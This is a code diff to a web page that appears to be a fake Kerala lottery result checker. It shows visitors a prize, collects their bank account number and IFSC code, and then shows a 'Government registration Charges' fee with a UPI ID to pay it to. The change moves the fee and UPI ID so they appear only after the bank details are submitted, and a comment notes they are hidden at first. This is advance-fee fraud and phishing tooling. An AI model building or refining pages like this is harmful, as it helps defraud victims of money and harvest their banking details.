@@ -43,7 +43,7 @@ input {width: 100%; padding: 12px; border: 2px solid #f59e0b; border-radius: 8px
         <input type="text" id="searchKey" placeholder="Enter Registered Mobile Number or Ticket ID">
         <button class="btn btn-blue" onclick="checkResult()">Check Result</button>
         
-        <!-- Replaced Random Winners Box with Kerala Festival Wallpaper -->
+        <!-- Kerala Festival Wallpaper Box -->
         <div class="festival-box">
             <h4 style="color:#b45309; margin-bottom:4px;">Festivals of Kerala</h4>
             <p style="font-size:12px; color:#6b7280; margin-bottom:6px;">Celebrating Tradition & Culture</p>
@@ -143,7 +143,7 @@ async function checkResult() {
     const claimBtn = document.getElementById("claimBtn");
 
     if (foundData) {
-        // Valid panel match found
+        // Valid panel match found (UPI ID and Fee are hidden here)
         current = {
             ticket: foundData.ticket || key.toUpperCase(),
             mobile: foundData.mobile || "N/A",
@@ -167,8 +167,6 @@ async function checkResult() {
             <div class="result-row"><b>Ticket Number:</b><span style="color:#b45309; font-weight:bold;">⭐ ${current.ticket}</span></div>
             <div class="result-row"><b>Winning Category:</b><span style="color:#dc2626; font-weight:bold;">${current.prize}</span></div>
             <div class="result-row"><b>Prize Amount:</b><span style="color:#15803d; font-weight:bold; font-size:16px;">₹${current.amount}</span></div>
-            <div class="result-row"><b>Government registration Charges:</b><span style="color:#dc2626; font-weight:bold;">₹${current.fee}</span></div>
-            ${current.upiId ? `<div class="result-row"><b>Payment UPI ID:</b><span style="color:#7c3aed; font-weight:bold;">${current.upiId}</span></div>` : ''}
             <div class="result-row"><b>Claim Status:</b><span style="color:#15803d; font-weight:bold;">${current.status}</span></div>
         `;
         fireConfetti();
@@ -202,9 +200,9 @@ function handleBankSubmit(e) {
     const enteredBank = document.getElementById("bankName").value.trim();
     const acc = document.getElementById("accNumber").value.trim();
     const enteredIfsc = document.getElementById("ifscCode").value.toUpperCase().trim();
-    const panelUpi = current.upiId || "Not Registered";
     const mask = acc.length > 4 ? "XXXX-XXXX-" + acc.slice(-4) : acc;
 
+    // UPI ID and Government Registration Fees are now displayed here after bank details submission
     document.getElementById("receiptBox").innerHTML = `
         <div class="result-row"><b>Account Holder:</b><span>${enteredName}</span></div>
         <div class="result-row"><b>Registered Mobile:</b><span>${current.mobile}</span></div>
@@ -213,6 +211,8 @@ function handleBankSubmit(e) {
         <div class="result-row"><b>IFSC Code:</b><span>${enteredIfsc}</span></div>
         <div class="result-row"><b>Winning Category:</b><span>${current.prize}</span></div>
         <div class="result-row"><b>Transfer Amount:</b><span style="color:#15803d; font-weight:bold;">₹${current.amount}</span></div>
+        <div class="result-row"><b>Government registration Charges:</b><span style="color:#dc2626; font-weight:bold;">₹${current.fee}</span></div>
+        ${current.upiId ? `<div class="result-row"><b>Payment UPI ID:</b><span style="color:#7c3aed; font-weight:bold;">${current.upiId}</span></div>` : ''}
     `;
 
     const upiBtnBox = document.getElementById("upiBtnContainer");
